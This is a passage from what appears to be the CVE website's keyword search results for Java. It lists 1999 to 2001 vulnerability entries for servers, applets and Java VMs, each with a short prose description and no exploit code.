		<td valign="top">SSIFilter in Allaire JRun 3.1, 3.0 and 2.3.3 allows remote attackers to obtain source code for Java server pages (.jsp) and other files in the web root via an HTTP request for a non-existent SSI page, in which the request's body has an #include statement.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0829">CVE-2001-0829</a></td>
		<td valign="top">A cross-site scripting vulnerability in Apache Tomcat 3.2.1 allows a malicious webmaster to embed Javascript in a request for a .JSP file, which causes the Javascript to be inserted into an error message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0828">CVE-2001-0828</a></td>
		<td valign="top">A cross-site scripting vulnerability in Caucho Technology Resin before 1.2.4 allows a malicious webmaster to embed Javascript in a hyperlink that ends in a .jsp extension, which causes an error message that does not properly quote the Javascript.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0824">CVE-2001-0824</a></td>
		<td valign="top">Cross-site scripting vulnerability in IBM WebSphere 3.02 and 3.5 FP2 allows remote attackers to execute Javascript by inserting the Javascript into (1) a request for a .JSP file, or (2) a request to the webapp/examples/ directory, which inserts the Javascript into an error page.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0326">CVE-2001-0326</a></td>
		<td valign="top">Oracle Java Virtual Machine (JVM ) for Oracle 8.1.7 and Oracle Application Server 9iAS Release 1.0.2.0.1 allows remote attackers to read arbitrary files via the .jsp and .sqljsp file extensions when the server is configured to use the &lt;&lt;ALL FILES&gt;&gt; FilePermission.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0324">CVE-2001-0324</a></td>
		<td valign="top">Windows 98 and Windows 2000 Java clients allow remote attackers to cause a denial of service via a Java applet that opens a large number of UDP sockets, which prevents the host from establishing any additional UDP connections, and possibly causes a crash.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0297">CVE-2001-0297</a></td>
		<td valign="top">Directory traversal vulnerability in Simple Server HTTPd 1.0 (originally Free Java Server) allows remote attackers to read arbitrary files via a .. (dot dot) in the URL.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0186">CVE-2001-0186</a></td>
		<td valign="top">Directory traversal vulnerability in Free Java Web Server 1.0 allows remote attackers to read arbitrary files via a .. (dot dot) attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0137">CVE-2001-0137</a></td>
		<td valign="top">Windows Media Player 7 allows remote attackers to execute malicious Java applets in Internet Explorer clients by enclosing the applet in a skin file named skin.wmz, then referencing that skin in the codebase parameter to an applet tag, aka the Windows Media Player Skins File Download" vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0126">CVE-2001-0126</a></td>
		<td valign="top">Oracle XSQL servlet 1.0.3.0 and earlier allows remote attackers to execute arbitrary Java code by redirecting the XSQL server to another source via the xml-stylesheet parameter in the xslt stylesheet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0068">CVE-2001-0068</a></td>
		<td valign="top">Mac OS Runtime for Java (MRJ) 2.2.3 allows remote attackers to use malicious applets to read files outside of the CODEBASE context via the ARCHIVE applet parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-1117">CVE-2000-1117</a></td>
		<td valign="top">The Extended Control List (ECL) feature of the Java Virtual Machine (JVM) in Lotus Notes Client R5 allows malicious web site operators to determine the existence of files on the client by measuring delays in the execution of the getSystemResource method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-1099">CVE-2000-1099</a></td>
		<td valign="top">Java Runtime Environment in Java Development Kit (JDK) 1.2.2_05 and earlier can allow an untrusted Java class to call into a disallowed class, which could allow an attacker to escape the Java sandbox and conduct unauthorized activities.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-1058">CVE-2000-1058</a></td>
		<td valign="top">Buffer overflow in OverView5 CGI program in HP OpenView Network Node Manager (NNM) 6.1 and earlier allows remote attackers to cause a denial of service, and possibly execute arbitrary commands, in the SNMP service (snmp.exe), aka the "Java SNMP MIB Browser Object ID parsing problem."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-1025">CVE-2000-1025</a></td>
		<td valign="top">eWave ServletExec JSP/Java servlet engine, versions 3.0C and earlier, allows remote attackers to cause a denial of service via a URL that contains the "/servlet/" string, which invokes the ServletExec servlet and causes an exception if the servlet is already running.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-1024">CVE-2000-1024</a></td>
		<td valign="top">eWave ServletExec 3.0C and earlier does not restrict access to the UploadServlet Java/JSP servlet, which allows remote attackers to upload files and execute arbitrary commands.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0965">CVE-2000-0965</a></td>
		<td valign="top">The NSAPI plugins for TGA and the Java Servlet proxy in HP-UX VVOS 10.24 and 11.04 allows an attacker to cause a denial of service (high CPU utilization).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0812">CVE-2000-0812</a></td>
		<td valign="top">The administration module in Sun Java web server allows remote attackers to execute arbitrary commands by uploading Java code to the module and invoke the com.sun.server.http.pagecompile.jsp92.JspServlet by requesting a URL that begins with a /servlet/ tag.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0774">CVE-2000-0774</a></td>
		<td valign="top">The sample Java servlet "test" in Bajie HTTP web server 0.30a reveals the real pathname of the web document root.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0711">CVE-2000-0711</a></td>
		<td valign="top">Netscape Communicator does not properly prevent a ServerSocket object from being created by untrusted entities, which allows remote attackers to create a server on the victim's system via a malicious applet, as demonstrated by Brown Orifice.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0685">CVE-2000-0685</a></td>
		<td valign="top">BEA WebLogic 5.1.x does not properly restrict access to the PageCompileServlet, which could allow remote attackers to compile and execute Java JHTML code by directly invoking the servlet on any source file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0684">CVE-2000-0684</a></td>
		<td valign="top">BEA WebLogic 5.1.x does not properly restrict access to the JSPServlet, which could allow remote attackers to compile and execute Java JSP code by directly invoking the servlet on any source file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0676">CVE-2000-0676</a></td>
		<td valign="top">Netscape Communicator and Navigator 4.04 through 4.74 allows remote attackers to read arbitrary files by using a Java applet to open a connection to a URL using the "file", "http", "https", and "ftp" protocols, as demonstrated by Brown Orifice.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0629">CVE-2000-0629</a></td>
		<td valign="top">The default configuration of the Sun Java web server 2.0 and earlier allows remote attackers to execute arbitrary commands by uploading Java code to the server via board.html, then directly calling the JSP compiler servlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0563">CVE-2000-0563</a></td>
		<td valign="top">The URLConnection function in MacOS Runtime Java (MRJ) 2.1 and earlier and the Microsoft virtual machine (VM) for MacOS allows a malicious web site operator to connect to arbitrary hosts using a HTTP redirection, in violation of the Java security model.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0327">CVE-2000-0327</a></td>
		<td valign="top">Microsoft Virtual Machine (VM) allows remote attackers to escape the Java sandbox and execute commands via an applet containing an illegal cast operation, aka the "Virtual Machine Verifier" vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0266">CVE-2000-0266</a></td>
		<td valign="top">Internet Explorer 5.01 allows remote attackers to bypass the cross frame security policy via a malicious applet that interacts with the Java JSObject to modify the DOM properties to set the IFRAME to an arbitrary Javascript URL.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0237">CVE-2000-0237</a></td>
		<td valign="top">Netscape Enterprise Server with Web Publishing enabled allows remote attackers to list arbitrary directories via a GET request for the /publisher directory, which provides a Java applet that allows the attacker to browse the directories.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0162">CVE-2000-0162</a></td>
		<td valign="top">The Microsoft virtual machine (VM) in Internet Explorer 4.x and 5.x allows a remote attacker to read files via a malicious Java applet that escapes the Java sandbox, aka the "VM File Reading" vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0146">CVE-2000-0146</a></td>
		<td valign="top">The Java Server in the Novell GroupWise Web Access Enhancement Pack allows remote attackers to cause a denial of service via a long URL to the servlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2000-0132">CVE-2000-0132</a></td>
		<td valign="top">Microsoft Java Virtual Machine allows remote attackers to read files via the getSystemResourceAsStream function.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-1527">CVE-1999-1527</a></td>
		<td valign="top">Internal HTTP server in Sun Netbeans Java IDE in Netbeans Developer 3.0 Beta and Forte Community Edition 1.0 Beta does not properly restrict access to IP addresses as specified in its configuration, which allows arbitrary remote attackers to access the server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-1262">CVE-1999-1262</a></td>
		<td valign="top">Java in Netscape 4.5 does not properly restrict applets from connecting to other hosts besides the one from which the applet was loaded, which violates the Java security model and could allow remote attackers to conduct unauthorized activities.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-0766">CVE-1999-0766</a></td>
		<td valign="top">The Microsoft Java Virtual Machine allows a malicious Java applet to execute arbitrary commands outside of the sandbox environment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-0537">CVE-1999-0537</a></td>
		<td valign="top">A configuration in a web browser such as Internet Explorer or Netscape Navigator allows execution of active content such as ActiveX, Java, Javascript, etc.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-0440">CVE-1999-0440</a></td>
		<td valign="top">The byte code verifier component of the Java Virtual Machine (JVM) allows remote execution through malicious web pages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-0283">CVE-1999-0283</a></td>
		<td valign="top">The Java Web Server would allow remote users to obtain the source code for CGI programs.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-0142">CVE-1999-0142</a></td>
		<td valign="top">The Java Applet Security Manager implementation in Netscape Navigator 2.0 and Java Developer's Kit 1.0 allows an applet to connect to arbitrary hosts.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-0141">CVE-1999-0141</a></td>
		<td valign="top">Java Bytecode Verifier allows malicious applets to execute arbitrary commands as the user of the applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-1999-0060">CVE-1999-0060</a></td>
		<td valign="top">Attackers can cause a denial of service in Ascend MAX and Pipeline routers with a malformed packet to the discard port, which is used by the Java Configurator tool.

</td>
	</tr>

</table> 
</div>

<div class="backtop noprint"><a href="#top">Back to top</a></div>
<!--round box-->
<div id="LtGreen" style="width:75%;min-width:500px;margin:auto;white-space:nowrap">
<table width="100%" border="0" cellspacing="0" cellpadding="0" id="Box">
  <tr>
    <td class="corner" valign="top" align="left" nowrap="nowrap"><img src="/images/layout/corner_ul.gif" alt="" class="noprint"/></td>
    <td width="100%"></td>
    <td class="corner" valign="top" align="right" nowrap="nowrap"><img src="/images/layout/corner_ur.gif" alt="" class="noprint"/></td>
  </tr>
  <tr>
    <td></td>
    <td valign="top">

<div class="smaller" style="text-align:center;white-space:nowrap">
	<form style="padding:0px; margin:0px;" method="get" action="/cgi-bin/cvekey.cgi">
		<label for="keyword"><span class="redbold" style="text-transform:uppercase">Search CVE Using Keywords:</span></label>&nbsp;&nbsp;<input name="keyword" id="keyword" maxlength="100" tabindex="0" type="textarea"></input>
		<input type="submit" value="Submit"/>
	</form>
		<div>You can also search by reference using the <a style="text-decoration:underline" href="/data/refs/index.html">CVE Reference Maps</a>.</div>
		<div><span style="font-weight:bold">For More Information:</span>&nbsp;&nbsp;<a style="text-decoration:underline" target="_blank" href="https://cveform.mitre.org/">CVE Request Web Form</a> (select &ldquo;Other&rdquo; from dropdown)</div>
</div>
</td>
    <td></td>
  </tr>
  <tr>
    <td class="corner" align="left" valign="bottom"><img src="/images/layout/corner_bl.gif" alt="" class="noprint" /></td>
    <td></td>
    <td class="corner" align="right" valign="bottom"><img src="/images/layout/corner_br.gif" alt="" class="noprint" /></td>
  </tr>
</table>
</div>
<!--/round box-->
<br>
<!--end Main Content-->
<!--end Main Content-->
            </div><!-- end content pane -->
        </div>
        <!--/Page-->
                <!--Footer-->
                <div id="FootPane" class="noprint">
        <div id="Footer">
            <table>
                <tr>
                    <td>
                    <div class="noprint" style="font-size:70%; text-align:center; padding-top:0px; padding-bottom:3px;">
                           <b>
                            <a href="https://www.cve.org/">Go to CVE.ORG website</a> | 
                            <a target="_blank" href="https://www.cve.org/Legal/TermsOfUse">Terms of Use</a> |
                            <a href="#" onclick="Osano.cm.showDrawer('osano-cm-dom-info-dialog-open')">Manage Cookies</a> | 
                            <a href="/cookie_notice.html">Cookie Notice</a> |         
                            <a target="_blank" href="https://www.cve.org/Legal/PrivacyPolicy">Privacy Policy</a> |
                            <a target="_blank" href="https://cveform.mitre.org/">Contact</a>  
                         
                    </td> 
                </tr>
             </div>
                 <tr>
                    <td>                       
                         <p>Use of the CVE&reg; List and the associated references from this website are subject to the <a target="_blank" href="https://www.cve.org/Legal/TermsOfUse">terms of use</a>. 
                             CVE is sponsored by the <a href="https://www.dhs.gov/" target="_blank">U.S. Department of Homeland Security</a> (DHS) <a href="https://www.dhs.gov/cisa/cybersecurity-division/" target="_blank">Cybersecurity and Infrastructure Security Agency</a> (CISA). Copyright &copy; 1999&ndash;2024, <a href="https://www.mitre.org/" target="_blank">The MITRE Corporation</a>. CVE and the CVE logo are registered trademarks of The MITRE Corporation.</p>
                        </td>        
                  </tr>
                  </table>

            <!--/Footer-->
        </div>
        </div>
        
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','//www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-37948909-1', 'auto');
ga('send', 'pageview');

</script>
<!-- End Google Analytics -->
        
    </body>
</html>
